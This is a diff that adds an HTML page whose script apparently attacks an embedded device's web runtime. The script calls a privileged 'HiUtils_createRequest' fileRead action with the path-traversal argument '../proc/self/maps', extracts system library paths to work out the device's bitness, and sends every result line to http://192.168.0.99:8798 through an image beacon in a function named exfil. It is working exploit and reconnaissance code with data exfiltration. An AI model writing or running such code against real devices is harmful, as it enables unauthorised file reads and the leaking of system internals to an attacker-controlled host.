@@ -1,0 +1,14 @@
+<!doctype html><html><head><meta charset="utf-8"></head>
+<body style="background:#000;color:#0f0;font:16px monospace"><pre id="out">u7wd…</pre>
+<script>
+(function(){var out=document.getElementById("out");
+function exfil(t){try{new Image().src="http://192.168.0.99:8798/k?d="+encodeURIComponent(String(t).slice(0,140));}catch(e){}}
+function line(t){out.textContent+="\n"+t;exfil(t);}
+function hi(a,p){try{return HiUtils_createRequest(a,p);}catch(e){return {exc:String(e)};}}
+// userland bitness: read /proc/self/maps (text) — look for 32 vs 64-bit lib paths & ld-linux name
+var m=hi("fileRead",{path:["../proc/self/maps"],mode:6}); var s=String(m.msg||"");
+line("maps len="+s.length);
+var uniq={}; s.split("\n").forEach(function(l){ var mm=l.match(/\/(\S+\.(so|so\.[0-9.]+))$/)||l.match(/(\/[^ ]*)/); if(mm){var p=mm[1]; if(/lib|ld-|phoenix|node/.test(p)) uniq[p]=1;} });
+Object.keys(uniq).slice(0,25).forEach(function(p){ line(p.slice(0,140)); });
+})();
+</script></body></html>
